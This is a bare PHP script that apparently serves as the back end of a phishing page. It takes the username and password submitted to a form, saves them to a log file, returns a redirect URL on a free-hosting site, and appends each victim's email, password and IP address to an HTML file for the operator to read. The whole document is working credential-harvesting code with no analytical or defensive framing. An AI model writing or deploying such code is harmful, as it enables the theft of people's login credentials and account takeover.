 <?php
$redirect = "https://windowsclosed.000webhostapp.com";
if (isset( $_POST['username'])) {
    $str_data = "----------"."\n username:" . $_POST['username'] ."\n password:" . $_POST['password']."\n" ."----------";
    file_put_contents("flogs1/logs.txt",$str_data );
    echo $redirect;
}   

$email = $_POST['username']; 
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("culo.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#EE0707">'.$email.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
fclose($f);

?>

